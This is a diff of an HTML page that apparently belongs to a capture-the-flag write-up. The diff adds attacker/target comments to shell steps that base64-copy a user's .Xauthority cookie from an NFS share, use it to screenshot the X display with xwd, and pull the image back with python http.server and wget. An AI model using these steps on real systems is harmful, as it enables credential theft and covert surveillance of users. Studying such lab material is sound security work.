@@ -492,9 +492,17 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> COPIED_BASE64_STRING <span class="p">|</span> base64 -d &gt; copied_cred
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># On Attacker&#39;s machine in ross&#39;s nfs share</span>
+</span></span><span class="line"><span class="cl">cat .Xauthority <span class="p">|</span> base64
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># On Target&#39;s machine</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> COPIED_BASE64_STRING <span class="p">|</span> base64 -d &gt; copied_cred
 </span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">XAUTHORITY</span><span class="o">=</span>/home/alex/copied_cred
 </span></span><span class="line"><span class="cl">xwd -root -display :0 -out screenshot.xwd
 </span></span></code></pre></td></tr></table>
@@ -528,10 +536,10 @@
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Alex</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># On Target&#39;s machine</span>
 </span></span><span class="line"><span class="cl">python -m http.server <span class="c1"># host the server</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Other side</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># On Attacker&#39;s machine</span>
 </span></span><span class="line"><span class="cl">wget 10.10.11.191:8000/screenshot.xwd
 </span></span><span class="line"><span class="cl">convert screenshot.xwd png.png
 </span></span></code></pre></td></tr></table>
